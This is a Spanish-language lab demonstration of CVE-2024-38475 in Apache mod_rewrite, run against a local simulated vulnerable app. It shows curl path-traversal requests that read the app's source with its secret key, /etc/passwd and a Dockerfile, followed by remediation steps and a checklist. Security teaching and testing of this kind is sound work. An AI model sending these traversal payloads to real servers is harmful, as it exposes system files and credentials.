# CVE-2024-38475 - Demostraci√≥n Pr√°ctica

## üî¥ CVE M√°s Cr√≠tico: mod_rewrite Improper Escaping

### Informaci√≥n del CVE

| Campo | Valor |
|-------|-------|
| **CVE ID** | CVE-2024-38475 |
| **Severidad** | **MEDIUM** (pero altamente explotable) |
| **CVSS Score** | 7.5 |
| **Componente** | Apache HTTP Server mod_rewrite |
| **Versiones Afectadas** | Apache 2.4.0 - 2.4.59 |
| **Fecha de Publicaci√≥n** | 2024-07-01 |
| **Impacto** | **Code Execution + Source Code Disclosure** |

### Descripci√≥n

Improper escaping of output in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, **resulting in code execution or source code disclosure**.

## üéØ Demostraci√≥n de Explotaci√≥n

### Endpoint Vulnerable
```
http://localhost:5000/cve/apache/rewrite-bypass
```

### Configuraci√≥n Vulnerable (Simulada)

```apache
# Vulnerable RewriteRule
RewriteEngine On
RewriteRule "^/docs/(.*)" "/var/www/$1"
```

El problema: **No valida ni escapa correctamente el par√°metro `$1`**, permitiendo path traversal.

## üíª Pruebas de Explotaci√≥n

### 1. Leer C√≥digo Fuente de la Aplicaci√≥n

```bash
# Leer app.py (c√≥digo fuente)
curl "http://localhost:5000/cve/apache/rewrite-bypass?path=app.py"
```

**Resultado**:
```python
"""
Vulnerable Web Application - CVE Simulation Environment
...
app.config['SECRET_KEY'] = 'super-secret-key-12345'
...
```

‚úÖ **√âxito**: C√≥digo fuente expuesto, incluyendo SECRET_KEY

### 2. Path Traversal - Leer /etc/passwd

```bash
# Escapar del directorio de la aplicaci√≥n
curl "http://localhost:5000/cve/apache/rewrite-bypass?path=../../../etc/passwd"
```

**Resultado**:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

‚úÖ **√âxito**: Archivo del sistema le√≠do

### 3. Leer Dockerfile (Configuraci√≥n)

```bash
curl "http://localhost:5000/cve/apache/rewrite-bypass?path=Dockerfile"
```

**Resultado**:
```dockerfile
FROM python:3.11-slim
WORKDIR /app
...
CMD ["python", "app.py"]
```

‚úÖ **√âxito**: Configuraci√≥n de infraestructura expuesta

## üî• Impacto Real

### Informaci√≥n que un Atacante Puede Obtener:

1. **C√≥digo Fuente Completo**
   - L√≥gica de negocio
   - Algoritmos propietarios
   - Credenciales hardcodeadas
   - Secrets y API keys

2. **Archivos de Configuraci√≥n**
   - Database credentials
   - API endpoints internos
   - Configuraci√≥n de servicios

3. **Archivos del Sistema**
   - `/etc/passwd` - Usuarios del sistema
   - `/etc/shadow` - Hashes de contrase√±as (si tiene permisos)
   - Logs del sistema

4. **Potencial Code Execution**
   - En combinaci√≥n con file upload
   - Puede ejecutar c√≥digo arbitrario

## üõ°Ô∏è Remediaci√≥n

### Soluci√≥n Inmediata

**Actualizar Apache HTTP Server a versi√≥n 2.4.60 o superior**

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get upgrade apache2

# CentOS/RHEL
sudo yum update httpd
```

### Mitigaci√≥n Temporal

```apache
# Usar el flag UnsafePrefixStat para reglas espec√≠ficas
RewriteRule "^/docs/(.*)" "/var/www/$1" [UnsafePrefixStat]

# O mejor: Validar el input
RewriteCond %{REQUEST_URI} !\.\.
RewriteRule "^/docs/([a-zA-Z0-9_-]+\.html)$" "/var/www/$1"
```

### Mejores Pr√°cticas

1. **Validaci√≥n Estricta**
   ```apache
   RewriteRule "^/docs/([a-zA-Z0-9_-]+)$" "/var/www/$1"
   ```

2. **Usar Alias en lugar de RewriteRule**
   ```apache
   Alias "/docs" "/var/www/docs"
   ```

3. **Implementar WAF**
   - ModSecurity con reglas OWASP CRS

## üìä Prueba con Bug Bounty Tool

```bash
# Escanear espec√≠ficamente este CVE
curl "http://localhost:5000/cve/apache/rewrite-bypass?path=../../../etc/passwd"

# Verificar con la herramienta
docker-compose exec app python src/main.py scan --target http://vulnerable-app:5000
```

## ‚úÖ Checklist de Verificaci√≥n

- [ ] Verificar versi√≥n de Apache: `apache2 -v`
- [ ] Revisar configuraci√≥n de mod_rewrite
- [ ] Buscar RewriteRules con backreferences
- [ ] Actualizar a Apache 2.4.60+
- [ ] Implementar validaci√≥n de input
- [ ] Monitorear logs por intentos de explotaci√≥n

---

**‚ö†Ô∏è ADVERTENCIA**: Esta demostraci√≥n es solo para prop√≥sitos educativos en entornos controlados.
